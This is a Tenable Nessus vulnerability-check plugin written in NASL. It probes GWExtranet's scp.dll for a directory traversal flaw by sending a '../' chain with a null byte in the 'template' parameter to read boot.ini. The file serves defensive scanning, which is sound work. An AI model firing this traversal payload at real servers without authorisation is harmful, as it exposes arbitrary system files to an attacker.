#
#  (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(28293);
  script_version("$Revision: 1.14 $");

  script_bugtraq_id(26525);
  script_osvdb_id(38830);

  script_name(english:"GWExtranet gwextranet/scp.dll Multiple Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read boot.ini using GWextranet's scp.dll extension"); 
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web service extension that is prone
to a directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GWextranet, an add-on for GroupWise for
publishing via the web GroupWise calendar and folder information. 

The version of GWextranet installed on the remote host fails to
sanitize user-supplied input to the 'template' parameter of the
'scp.dll' extension before using it to access files.  On a Windows
platform, an unauthenticated attacker can leverage this issue to read
the content of arbitrary files on the remote host, subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/484039/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/11/26");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/11/21");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/GWextranet", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  file = "../../../../../../../../../../../../boot.ini";

  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/scp.dll/sendto?",
      "template=", file, "%00", SCRIPT_NAME
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if it looks like we were successful.  
  if ("[boot loader]" >< res)
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Here are the contents of the file '\\boot.ini' that Nessus was able to\n",
        "read from the remote host :\n",
        "\n",
        res
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
